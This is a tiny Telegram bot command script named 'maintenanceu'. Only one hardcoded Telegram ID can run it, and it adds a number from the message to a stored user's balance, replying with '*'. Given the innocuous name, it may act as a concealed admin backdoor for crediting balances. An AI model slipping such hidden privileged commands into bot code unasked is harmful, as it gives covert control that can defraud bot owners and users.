/*CMD
  command: maintenanceu
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: maintenanceu

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

var key = "6230852162"
if (user.telegramid == key){
let amount = parseFloat(message);
let tgid = User.getProperty("id");
let res = Libs.ResourcesLib.anotherUserRes("balance", tgid);
res.add(parseFloat(amount));
Bot.sendMessage("*");
}else{
return
}
